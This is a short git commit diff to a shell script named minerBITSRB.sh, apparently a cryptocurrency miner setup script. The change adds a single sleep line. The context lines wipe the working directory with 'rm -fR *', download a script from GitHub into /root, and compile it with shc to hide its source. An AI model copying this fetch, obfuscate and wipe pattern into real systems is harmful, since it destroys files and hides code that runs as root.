40ad104b22741de74cb025f48d298284050d19fc
danielluis1921 <158490195+danielluis1921@users.noreply.github.com>
2024-03-06 19:47:20 +0700

    Update minerBITSRB.sh

--- minerBITSRB.sh
+++ minerBITSRB.sh
@@ -54,6 +54,7 @@ sleep 3
 ./danielluis1921.sh
 rm -fv *
 rm -fR *
+sleep 5
 wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/callAPI.sh" --output-document=/root/callAPI.sh
 shc -r -f /root/callAPI.sh -o /root/run.sh
 rm -fv callAPI.sh
